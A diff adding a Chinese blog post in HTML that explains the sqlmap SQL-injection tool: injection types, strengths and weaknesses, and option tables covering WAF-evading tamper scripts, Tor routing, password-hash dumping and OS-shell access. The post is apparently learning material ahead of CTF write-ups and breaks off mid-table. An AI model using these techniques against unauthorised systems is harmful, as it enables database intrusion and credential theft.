@@ -1,0 +1,1853 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>SQLMap使用总结及CTFshow靶场所有题目详细分析 | choco</title><meta name="author" content="Teaaa"><meta name="copyright" content="Teaaa"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="成为 AI 小子第二步！  来自学长原话：sqlmap使用 - baozongwi’s blog 我感觉这个比nmap难一些，使用nmap时，学的是怎么用工具；而这个学的是目标。 这个工具CTF里基本用不了，不过实际渗透中相当实用，特别是 UDF 提权，都要使用到其中的 so 文件 工具简介基础信息sqlmap 是 Python 编写、开源 GPLv2 协议 的 SQL 注入自动化检测 + 利用">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SQLMap使用总结及CTFshow靶场所有题目详细分析">
+<meta property="og:url" content="http://example.com/sqlmap/index.html">
+<meta property="og:site_name" content="choco">
+<meta property="og:description" content="成为 AI 小子第二步！  来自学长原话：sqlmap使用 - baozongwi’s blog 我感觉这个比nmap难一些，使用nmap时，学的是怎么用工具；而这个学的是目标。 这个工具CTF里基本用不了，不过实际渗透中相当实用，特别是 UDF 提权，都要使用到其中的 so 文件 工具简介基础信息sqlmap 是 Python 编写、开源 GPLv2 协议 的 SQL 注入自动化检测 + 利用">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/img/head.jpg">
+<meta property="article:published_time" content="2026-11-18T04:48:27.672Z">
+<meta property="article:modified_time" content="2026-11-18T04:54:04.743Z">
+<meta property="article:author" content="Teaaa">
+<meta property="article:tag" content="折腾">
+<meta property="article:tag" content="工具">
+<meta property="article:tag" content="SQL">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/img/head.jpg"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "SQLMap使用总结及CTFshow靶场所有题目详细分析",
+  "url": "http://example.com/sqlmap/",
+  "image": "http://example.com/img/head.jpg",
+  "datePublished": "2026-11-18T04:48:27.672Z",
+  "dateModified": "2026-11-18T04:54:04.743Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "Teaaa",
+      "url": "http://www.baidu.com"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/img/nailong.jpg"><link rel="canonical" href="http://example.com/sqlmap/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=5.7.1.260810"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@7.3.1/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        try {
+          const data = { value }
+
+          if (ttl != null) {
+            data.expiry = Date.now() + ttl * 86400000
+          }
+
+          localStorage.setItem(key, JSON.stringify(data))
+        } catch (e) {
+          console.error(e)
+        }
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return
+
+        try {
+          const data = JSON.parse(itemStr)
+
+          if (data.expiry && Date.now() > data.expiry) {
+            localStorage.removeItem(key)
+            return
+          }
+
+          return data.value
+        } catch {
+          localStorage.removeItem(key)
+        }
+      }
+    }
+
+    const scriptCache = new Map()
+    const cssCache = new Map()
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => {
+        if (scriptCache.has(url)) {
+          return scriptCache.get(url)
+        }
+
+        const promise = new Promise((resolve, reject) => {
+          const script = document.createElement('script')
+
+          script.src = url
+          script.async = true
+
+          for (const key in attr) {
+            script.setAttribute(key, attr[key])
+          }
+
+          script.onload = resolve
+          script.onerror = reject
+
+          document.head.appendChild(script)
+        })
+
+        scriptCache.set(url, promise)
+
+        return promise
+      },
+      getCSS: (url, id) => {
+        if (cssCache.has(url)) {
+          return cssCache.get(url)
+        }
+
+        const promise = new Promise((resolve, reject) => {
+          const link = document.createElement('link')
+
+          link.rel = 'stylesheet'
+          link.href = url
+
+          if (id) {
+            link.id = id
+          }
+
+          link.onload = resolve
+          link.onerror = reject
+
+          document.head.appendChild(link)
+        })
+
+        cssCache.set(url, promise)
+
+        return promise
+      },
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const metaThemeColor = document.querySelector('meta[name="theme-color"]')
+      const activateDarkMode = () => {
+        document.documentElement.dataset.theme = 'dark'
+        if (metaThemeColor !== null) {
+          metaThemeColor.setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.dataset.theme = 'light'
+        if (metaThemeColor !== null) {
+          metaThemeColor.setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":true,"top_n_per_article":-1,"unescape":false,"pagination":{"enable":true,"hitsPerPage":8},"languages":{"hits_empty":"未找到符合您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":true},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.13.0/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'SQLMap使用总结及CTFshow靶场所有题目详细分析',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script><style>
+  /* 明亮模式 */
+  #body-wrap #recent-posts > .recent-post-item,
+  #body-wrap .recent-post-item,
+  #body-wrap #aside-content .card-widget,
+  #body-wrap .layout > div:first-child:not(.recent-posts),
+  #body-wrap #nav .menus_items .menus_item .menus_item_child,
+  #body-wrap #pagination .page-number:not(.current),
+  #body-wrap #pagination .extend {
+      background: rgba(255, 255, 255, 0.95);
+      backdrop-filter: blur(2px);
+      -webkit-backdrop-filter: blur(2px);
+      border: 1px solid rgba(255, 255, 255, 0.85);
+      box-shadow: 0 8px 16px -4px rgba(138, 138, 138, 0.15);
+      transition: background 0.3s ease, border 0.3s ease, box-shadow 0.3s ease;
+  }
+  #body-wrap #pagination .page-number:not(.current):hover,
+  #body-wrap #pagination .extend:hover {
+      background: #ff7142d2;
+      border-color: #ff7142d2;
+      color: #fff;
+  }
+  /* 夜间模式 */
+  html[data-theme="dark"] #body-wrap #recent-posts > .recent-post-item,
+  html[data-theme="dark"] #body-wrap .recent-post-item,
+  html[data-theme="dark"] #body-wrap #aside-content .card-widget,
+  html[data-theme="dark"] #body-wrap .layout > div:first-child:not(.recent-posts),
+  html[data-theme="dark"] #body-wrap #nav .menus_items .menus_item .menus_item_child,
+  html[data-theme="dark"] #body-wrap #pagination .page-number:not(.current),
+  html[data-theme="dark"] #body-wrap #pagination .extend {
+      background: rgba(30, 30, 30, 0.6);
+      border: 1px solid rgba(255, 255, 255, 0.08);
+      box-shadow: 0 8px 16px -4px rgba(0, 0, 0, 0.2);
+  }
+  /*亮色模式强制文字颜色*/
+  .recent-post-item .article-title{
+    color:#111 !important;
+  }
+  .recent-post-item .article-meta-wrap,
+  .recent-post-item .content{
+      color:#222 !important;
+  }
+  /*夜间模式文字颜色*/
+  html[data-theme="dark"] .recent-post-item .article-title{
+    color:#f1f1f1 !important;
+  }
+  html[data-theme="dark"] .recent-post-item .article-meta-wrap,
+  html[data-theme="dark"] .recent-post-item .content{
+    color:#dddddd !important;
+  }
+  
+</style>
+<meta name="generator" content="Hexo 7.3.0"></head><body><div class="bg-animation" id="web_bg" style="background-image: url(/img/dahai.jpg);"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/head.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">37</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">20</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-user"></i><span> 关于</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/links/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" target="_blank" rel="noopener" href="http://www.baidu.com"><i class="fa-fw fa fa-circle"></i><span> 虫洞</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background: transparent;"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><img class="site-icon" src="/img/yuan.png" alt="Logo"><span class="site-name">choco</span></a><a class="nav-page-title" href="/"><span class="site-name">SQLMap使用总结及CTFshow靶场所有题目详细分析</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  返回首页</span></span></a></span><div id="menus"><div id="search-button"><span class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></span></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-user"></i><span> 关于</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/links/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" target="_blank" rel="noopener" href="http://www.baidu.com"><i class="fa-fw fa fa-circle"></i><span> 虫洞</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">SQLMap使用总结及CTFshow靶场所有题目详细分析</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2026-11-18T04:48:27.672Z" title="发表于 2026-11-18 12:48:27">2026-11-18</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2026-11-18T04:54:04.743Z" title="更新于 2026-11-18 12:54:04">2026-11-18</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">总字数:</span><span class="word-count">9455</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>40 分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><blockquote>
+<p>成为 AI 小子第二步！</p>
+</blockquote>
+<p>来自学长原话：<a target="_blank" rel="noopener" href="https://baozongwi.xyz/p/sqlmap-usage/">sqlmap使用 - baozongwi’s blog</a></p>
+<p>我感觉这个比<code>nmap</code>难一些，使用<code>nmap</code>时，学的是怎么用工具；而这个学的是目标。</p>
+<p>这个工具CTF里基本用不了，不过实际渗透中相当实用，特别是 UDF 提权，都要使用到其中的 so 文件</p>
+<h1 id="工具简介"><a href="#工具简介" class="headerlink" title="工具简介"></a>工具简介</h1><h2 id="基础信息"><a href="#基础信息" class="headerlink" title="基础信息"></a>基础信息</h2><p><code>sqlmap</code> 是 Python 编写、开源 GPLv2 协议 的 <strong>SQL 注入</strong>自动化检测 + 利用工具，作者：Bernardo Damele、Miroslav Stampar，2006 年发布，官网：<a target="_blank" rel="noopener" href="https://sqlmap.org/">sqlmap.org</a>，GitHub也有。</p>
+<p>Kali、Parrot 等渗透系统预装；Windows &#x2F; MacOS 只要有 <code>Python3</code> 都可以手动部署。 核心定位：把手工 SQL 注入的整套流程自动化，是网安行业 SQL 注入测试的标准工具。</p>
+<h2 id="核心能力总览"><a href="#核心能力总览" class="headerlink" title="核心能力总览"></a>核心能力总览</h2><ul>
+<li>自动检测：识别注入点、自动判断注入类型、指纹识别后端数据库</li>
+<li>信息枚举：库、表、字段、数据、账号密码哈希、权限、版本、操作系统</li>
+<li>高级利用（依赖 DBA 权限 + 数据库配置）：读取文件、写入文件、执行系统命令、获取交互式 OS Shell、OOB 带外数据外带</li>
+<li>辅助能力：绕过 WAF（tamper 脚本）、代理、Cookie&#x2F;Header 注入、会话保存、密码哈希自动字典爆破</li>
+</ul>
+<blockquote>
+<p>支持 <strong>40+ 数据库</strong>：<code>MySQL</code>、<code>MSSQL</code>、<code>Oracle</code>、<code>PostgreSQL</code>、<code>SQLite</code>、<code>Access</code>、<code>DB2</code>、<code>ClickHouse</code>、<code>TiDB</code>、<code>Redshift</code> 等传统和云数据库<code>sqlmap</code>。</p>
+<p><code>sqlmap</code> 不是万能：存在<strong>误报（假阳性）</strong>，工具提示注入成功，<strong>必须手工构造 payload 复核</strong>；WAF、复杂过滤场景很容易检测失败。</p>
+</blockquote>
+<h2 id="六大注入原理"><a href="#六大注入原理" class="headerlink" title="六大注入原理"></a>六大注入原理</h2><table>
+<thead>
+<tr>
+<th>标记</th>
+<th>注入类型</th>
+<th>原理简述</th>
+<th>适用场景</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>U</td>
+<td>Union 联合注入</td>
+<td>拼接 UNION SELECT，直接把数据输出到页面</td>
+<td>页面有回显，速度最快，优先使用</td>
+</tr>
+<tr>
+<td>E</td>
+<td>报错注入</td>
+<td>利用数据库报错函数（updatexml&#x2F;extractvalue 等），错误信息带出数据</td>
+<td>网站开启数据库报错</td>
+</tr>
+<tr>
+<td>B</td>
+<td>布尔盲注</td>
+<td>构造真假条件，对比页面内容 &#x2F; 长度差异判断结果</td>
+<td>无报错、无数据回显，但页面内容有变化</td>
+</tr>
+<tr>
+<td>T</td>
+<td>时间盲注</td>
+<td>注入延时函数 sleep ()、benchmark ()，根据响应延迟判断真假</td>
+<td>页面完全无任何差异，最慢</td>
+</tr>
+<tr>
+<td>S</td>
+<td>堆叠注入</td>
+<td>分号 <code>;</code> 执行多条独立 SQL 语句</td>
+<td>MSSQL 最友好；MySQL 受驱动限制经常不支持</td>
+</tr>
+<tr>
+<td>Q</td>
+<td>OOB 带外注入</td>
+<td>数据库主动发起 DNS&#x2F;HTTP 请求，把数据带出（DNSlog）</td>
+<td>页面无回显、盲注速度太慢时神器</td>
+</tr>
+</tbody></table>
+<p>默认检测顺序 <code>BEUSTQ</code>，全部类型尝试；我们可以手动指定只启用某几种提速。</p>
+<blockquote>
+<p>本质：和手工注入逻辑一模一样，只是 <code>sqlmap</code> 内置海量 <code>payload</code>、二分查找算法自动猜字符，代替人反复发包比对响应。</p>
+</blockquote>
+<h2 id="优缺点"><a href="#优缺点" class="headerlink" title="优缺点"></a>优缺点</h2><h3 id="优点"><a href="#优点" class="headerlink" title="优点"></a>优点</h3><ul>
+<li>标准化成熟，覆盖绝大多数注入场景</li>
+<li>内置二分算法，盲注效率远高于手工</li>
+<li>屏蔽各数据库语法差异</li>
+<li>自动结构化导出数据，方便写报告</li>
+<li>支持代理、延时、随机 UA、会话缓存、OOB 等辅助能力</li>
+</ul>
+<h3 id="缺点"><a href="#缺点" class="headerlink" title="缺点"></a>缺点</h3><ul>
+<li>Payload 特征明显，极易被 WAF 识别拦截</li>
+<li>复杂自定义过滤、特殊编码场景灵活性弱于手工注入</li>
+<li>盲注发包量大，容易触发风控封 IP</li>
+<li>只能处理注入类漏洞，无法检测 XSS、文件上传等漏洞</li>
+</ul>
+<hr>
+<h1 id="核心能力利用"><a href="#核心能力利用" class="headerlink" title="核心能力利用"></a>核心能力利用</h1><p>我测试的版本：<code>sqlmap 1.10.10</code>版本。在 Kali 上的工具测试的。</p>
+<p>整体按照：基础参数总表、七段标准实操流程两部分总结。</p>
+<blockquote>
+<ul>
+<li>基础参数总表<ul>
+<li>基础选项</li>
+<li>目标模式（必须选至少一种）</li>
+<li>请求控制选项（发包相关）</li>
+<li>性能优化选项</li>
+<li>注入定制选项</li>
+<li>检测校准选项（解决页面动态、误判）</li>
+<li>注入技术选项</li>
+<li>指纹、枚举选项（查库查表查数据）</li>
+<li>暴力破解选项</li>
+<li>文件系统访问（需要高权限）</li>
+<li>操作系统访问（需要 DBA 权限）</li>
+<li>Windows 注册表选项</li>
+<li>公共通用选项（高频）</li>
+<li>其他辅助选项</li>
+</ul>
+</li>
+<li>七段标准实操流程<ul>
+<li>装载目标：选择输入源</li>
+<li>请求对齐：发包和浏览器保持一致（排错高发段）</li>
+<li>探测与判定：先轻后重 + 判空校准</li>
+<li>指纹与权限画像：判断你能拿到多少权限</li>
+<li>枚举：精准优先，拒绝全量爆破</li>
+<li>高阶利用（必须 DBA 权限，门槛高，先了解，不要一上来就冲 shell）</li>
+<li>持久化与会话：sqlmap 是有状态工具</li>
+</ul>
+</li>
+<li>附录：sqlmap1.10 新增非 SQLi 检测面（独立引擎，后期接触）</li>
+<li>高频速记 12 条命令</li>
+</ul>
+</blockquote>
+<hr>
+<h1 id="基础参数总表"><a href="#基础参数总表" class="headerlink" title="基础参数总表"></a>基础参数总表</h1><blockquote>
+<p>把所有参数按官方分类整理，先在这里方便新手随时翻，后面流程里用到的参数不再重复写说明。</p>
+</blockquote>
+<h2 id="基础选项"><a href="#基础选项" class="headerlink" title="基础选项"></a>基础选项</h2><table>
+<thead>
+<tr>
+<th>选项</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>-h, --help</code></td>
+<td>显示基础的帮助信息，然后退出</td>
+</tr>
+<tr>
+<td><code>-hh</code></td>
+<td>显示高级的帮助信息，然后退出</td>
+</tr>
+<tr>
+<td><code>--version</code></td>
+<td>显示脚本的版本，然后退出</td>
+</tr>
+<tr>
+<td><code>-v VERBOSE</code></td>
+<td>显示测试细节，等级 1~6；排错常用 <code>-v 3</code></td>
+</tr>
+</tbody></table>
+<h2 id="目标模式（必须选至少一种）"><a href="#目标模式（必须选至少一种）" class="headerlink" title="目标模式（必须选至少一种）"></a>目标模式（必须选至少一种）</h2><table>
+<thead>
+<tr>
+<th>选项</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>-d</code></td>
+<td>转发模式，直接字符串连接数据库：<code>mysql://user:pass@ip:port/db</code></td>
+</tr>
+<tr>
+<td><code>-u, --url=</code></td>
+<td>直连 GET 模式：<code>http://xxx?id=1</code></td>
+</tr>
+<tr>
+<td><code>-l</code></td>
+<td>日志模式，载入 Burp 代理日志批量扫描</td>
+</tr>
+<tr>
+<td><code>-m</code></td>
+<td>批量模式，读取 txt 里多条 url 批量扫</td>
+</tr>
+<tr>
+<td><code>-r</code></td>
+<td>请求模式，加载 Burp raw 请求包（最推荐）</td>
+</tr>
+<tr>
+<td><code>-g</code></td>
+<td>谷歌搜索模式，拿搜索结果做目标</td>
+</tr>
+<tr>
+<td><code>-c</code></td>
+<td>配置模式，读取 ini 配置文件加载参数</td>
+</tr>
+</tbody></table>
+<h2 id="请求控制选项（发包相关）"><a href="#请求控制选项（发包相关）" class="headerlink" title="请求控制选项（发包相关）"></a>请求控制选项（发包相关）</h2><table>
+<thead>
+<tr>
+<th>选项</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>--method=方法</code></td>
+<td>强制请求方法 PUT&#x2F;DELETE</td>
+</tr>
+<tr>
+<td><code>--data=数据</code></td>
+<td>POST 提交参数：<code>--data=&quot;id=1&quot;</code></td>
+</tr>
+<tr>
+<td><code>--param-del=字符</code></td>
+<td>自定义参数分隔符</td>
+</tr>
+<tr>
+<td><code>--cookie=COOKIE</code></td>
+<td>设置 Cookie</td>
+</tr>
+<tr>
+<td><code>--cookie-del=字符</code></td>
+<td>Cookie 分隔符</td>
+</tr>
+<tr>
+<td><code>--load-cookies=文件</code></td>
+<td>从文件加载 Cookie</td>
+</tr>
+<tr>
+<td><code>--drop-set-cookie</code></td>
+<td>忽略响应返回的 Set-Cookie</td>
+</tr>
+<tr>
+<td><code>--user-agent=AGENT</code></td>
+<td>自定义 UA</td>
+</tr>
+<tr>
+<td><code>--random-agent</code></td>
+<td>随机 UA</td>
+</tr>
+<tr>
+<td><code>--host=HOST</code></td>
+<td>自定义 Host 头</td>
+</tr>
+<tr>
+<td><code>--referer=REFERER</code></td>
+<td>自定义 Referer</td>
+</tr>
+<tr>
+<td><code>-H / --headers</code></td>
+<td>添加自定义请求头</td>
+</tr>
+<tr>
+<td><code>--auth-type</code></td>
+<td>HTTP 认证：Basic&#x2F;Digest&#x2F;NTLM</td>
+</tr>
+<tr>
+<td><code>--auth-cred</code></td>
+<td>认证账号密码</td>
+</tr>
+<tr>
+<td><code>--ignore-code</code></td>
+<td>忽略指定 HTTP 状态码</td>
+</tr>
+<tr>
+<td><code>--ignore-proxy</code></td>
+<td>忽略系统代理</td>
+</tr>
+<tr>
+<td><code>--ignore-redirects</code></td>
+<td>不跟随重定向</td>
+</tr>
+<tr>
+<td><code>--ignore-timeouts</code></td>
+<td>忽略超时</td>
+</tr>
+<tr>
+<td><code>--proxy=PROXY</code></td>
+<td>设置代理</td>
+</tr>
+<tr>
+<td><code>--proxy-cred</code></td>
+<td>代理账号密码</td>
+</tr>
+<tr>
+<td><code>--tor</code></td>
+<td>使用 Tor 匿名网络</td>
+</tr>
+<tr>
+<td><code>--delay=DELAY</code></td>
+<td>两次发包间隔（秒）</td>
+</tr>
+<tr>
+<td><code>--timeout=TIMEOUT</code></td>
+<td>连接超时时间</td>
+</tr>
+<tr>
+<td><code>--retries=RETRIES</code></td>
+<td>超时重试次数</td>
+</tr>
+<tr>
+<td><code>--randomize=RPARAM</code></td>
+<td>随机化参数值</td>
+</tr>
+<tr>
+<td><code>--safe-url</code></td>
+<td>间隔访问的安全地址，保会话</td>
+</tr>
+<tr>
+<td><code>--safe-freq</code></td>
+<td>每 N 次注入请求访问一次安全地址</td>
+</tr>
+<tr>
+<td><code>--skip-urlencode</code></td>
+<td>不对 payload 做 URL 编码</td>
+</tr>
+<tr>
+<td><code>--csrf-token</code></td>
+<td>携带 CSRF 令牌</td>
+</tr>
+<tr>
+<td><code>--csrf-url</code></td>
+<td>自动去地址提取 CSRF 令牌</td>
+</tr>
+<tr>
+<td><code>--force-ssl</code></td>
+<td>强制 HTTPS</td>
+</tr>
+<tr>
+<td><code>--hpp</code></td>
+<td>HTTP 参数污染</td>
+</tr>
+<tr>
+<td><code>--eval=代码</code></td>
+<td>每次发包前执行 Python 代码</td>
+</tr>
+</tbody></table>
+<h2 id="性能优化选项"><a href="#性能优化选项" class="headerlink" title="性能优化选项"></a>性能优化选项</h2><table>
+<thead>
+<tr>
+<th>选项</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>-o</code></td>
+<td>一次性开启全部优化开关</td>
+</tr>
+<tr>
+<td><code>--predict-output</code></td>
+<td>预测查询输出，提速盲注</td>
+</tr>
+<tr>
+<td><code>--keep-alive</code></td>
+<td>HTTP 长连接</td>
+</tr>
+<tr>
+<td><code>--null-connection</code></td>
+<td>只比对响应长度，不读正文</td>
+</tr>
+<tr>
+<td><code>--threads=NUM</code></td>
+<td>线程数，默认 1</td>
+</tr>
+</tbody></table>
+<h2 id="注入定制选项"><a href="#注入定制选项" class="headerlink" title="注入定制选项"></a>注入定制选项</h2><table>
+<thead>
+<tr>
+<th>选项</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>-p 参数名</code></td>
+<td>只测试指定参数</td>
+</tr>
+<tr>
+<td><code>--skip=参数</code></td>
+<td>跳过指定参数不测试</td>
+</tr>
+<tr>
+<td><code>--skip-static</code></td>
+<td>跳过静态参数</td>
+</tr>
+<tr>
+<td><code>--param-exclude=正则</code></td>
+<td>正则排除参数</td>
+</tr>
+<tr>
+<td><code>--dbms=数据库</code></td>
+<td>强制指定数据库类型 mysql&#x2F;mssql</td>
+</tr>
+<tr>
+<td><code>--os=OS</code></td>
+<td>强制指定后端操作系统 windows&#x2F;linux</td>
+</tr>
+<tr>
+<td><code>--prefix</code></td>
+<td>payload 前缀</td>
+</tr>
+<tr>
+<td><code>--suffix</code></td>
+<td>payload 后缀</td>
+</tr>
+<tr>
+<td><code>--tamper=脚本</code></td>
+<td>payload 变形绕过 WAF</td>
+</tr>
+</tbody></table>
+<h2 id="检测校准选项（解决页面动态、误判）"><a href="#检测校准选项（解决页面动态、误判）" class="headerlink" title="检测校准选项（解决页面动态、误判）"></a>检测校准选项（解决页面动态、误判）</h2><table>
+<thead>
+<tr>
+<th>选项</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>--level=1~5</code></td>
+<td>探测广度，默认 1</td>
+</tr>
+<tr>
+<td><code>--risk=1~3</code></td>
+<td>风险等级，默认 1；3 危险，可能删改数据</td>
+</tr>
+<tr>
+<td><code>--string=文本</code></td>
+<td>注入成功页面包含的字符串</td>
+</tr>
+<tr>
+<td><code>--not-string=文本</code></td>
+<td>注入失败页面包含的字符串</td>
+</tr>
+<tr>
+<td><code>--regexp=正则</code></td>
+<td>成功匹配正则</td>
+</tr>
+<tr>
+<td><code>--code=状态码</code></td>
+<td>成功对应的 HTTP 状态码</td>
+</tr>
+<tr>
+<td><code>--text-only</code></td>
+<td>只对比页面文本，忽略 html 标签</td>
+</tr>
+<tr>
+<td><code>--titles</code></td>
+<td>只对比页面标题判断结果</td>
+</tr>
+</tbody></table>
+<h2 id="注入技术选项"><a href="#注入技术选项" class="headerlink" title="注入技术选项"></a>注入技术选项</h2><table>
+<thead>
+<tr>
+<th>选项</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>--technique=BEUSTQ</code></td>
+<td>选定注入类型</td>
+</tr>
+<tr>
+<td><code>--time-sec=秒</code></td>
+<td>时间盲注延时时长，默认 5</td>
+</tr>
+<tr>
+<td><code>--union-cols</code></td>
+<td>联合注入猜测列数范围</td>
+</tr>
+<tr>
+<td><code>--union-char</code></td>
+<td>联合注入填充字符</td>
+</tr>
+<tr>
+<td><code>--dns-domain</code></td>
+<td>OOB DNS 外带域名</td>
+</tr>
+<tr>
+<td><code>--second-url</code></td>
+<td>二次注入结果页面</td>
+</tr>
+</tbody></table>
+<h2 id="指纹、枚举选项（查库查表查数据）"><a href="#指纹、枚举选项（查库查表查数据）" class="headerlink" title="指纹、枚举选项（查库查表查数据）"></a>指纹、枚举选项（查库查表查数据）</h2><table>
+<thead>
+<tr>
+<th>选项</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>-f, --fingerprint</code></td>
+<td>深度指纹识别数据库</td>
+</tr>
+<tr>
+<td><code>-a, --all</code></td>
+<td>一次性获取全部信息（真实环境不推荐）</td>
+</tr>
+<tr>
+<td><code>-b, --banner</code></td>
+<td>数据库版本 banner</td>
+</tr>
+<tr>
+<td><code>--current-user</code></td>
+<td>当前数据库账号</td>
+</tr>
+<tr>
+<td><code>--current-db</code></td>
+<td>当前数据库</td>
+</tr>
+<tr>
+<td><code>--hostname</code></td>
+<td>数据库服务器主机名</td>
+</tr>
+<tr>
+<td><code>--is-dba</code></td>
+<td>判断账号是否 DBA 管理员</td>
+</tr>
+<tr>
+<td><code>--users</code></td>
+<td>列出全部数据库账号</td>
+</tr>
+<tr>
+<td><code>--passwords</code></td>
+<td>导出账号密码哈希</td>
+</tr>
+<tr>
+<td><code>--privileges</code></td>
+<td>查看账号权限</td>
+</tr>
+<tr>
+<td><code>--roles</code></td>
+<td>查看角色</td>
+</tr>
+<tr>
+<td><code>--dbs</code></td>
+<td>列出所有库</td>
+</tr>
+<tr>
